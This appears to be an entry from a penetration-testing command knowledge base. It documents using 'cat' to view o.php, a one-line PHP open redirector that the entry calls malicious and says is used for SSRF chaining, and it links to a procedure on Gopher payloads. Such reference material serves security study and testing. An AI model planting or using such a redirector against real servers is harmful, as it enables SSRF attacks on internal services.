---
id: cmd-uuid-1
data: cat o.php
tags:
  - file-view
  - php
type: command
output: '<?php $s = $_GET["s"]; header("Location: ".$s); ?>'
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:09.341Z'
verified: false
validated: true
submitted: true
---
# cat-malicious-php-file

## Command

```bash
cat o.php
```

## Description

Displays the contents of the malicious PHP redirector file o.php used for SSRF chaining, verifying the redirect logic based on the 's' GET parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| o.php | Path to the PHP file | Yes |

## Examples

### Basic Usage

```bash
cat o.php
```

### Advanced Usage

```bash
cat /path/to/o.php | grep header
```

## Expected Output

<?php $s = $_GET["s"]; header("Location: ".$s); ?>

## Related

- [[Related Procedure: Setup-Chaining-PHP-for-Gopher-Payloads]]
